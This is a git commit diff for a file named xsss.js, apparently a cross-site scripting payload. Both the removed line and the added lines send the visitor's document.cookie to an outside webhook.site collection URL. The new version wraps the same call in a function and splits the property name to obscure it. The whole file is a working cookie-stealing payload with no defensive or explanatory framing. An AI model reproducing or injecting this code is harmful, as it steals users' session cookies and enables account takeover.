08afad1494ef887254e08fad76fce152f20f76eb
1NF3RN0 <120143396+ItzMed@users.noreply.github.com>
2024-10-06 15:20:58 +0100

    Update xsss.js

--- xsss.js
+++ xsss.js
@@ -1,1 +1,5 @@
-fetch('https://webhook.site/fef07d14-412a-4afd-b4d1-bc6cc4cf3f3f?cookie=' + document.cookie);
+(() => {
+  const w = 'https://webhook.site/fef07d14-412a-4afd-b4d1-bc6cc4cf3f3f';
+  const c = 'cookie';
+  fetch(w + '?' + c + '=' + document[c]);
+})();
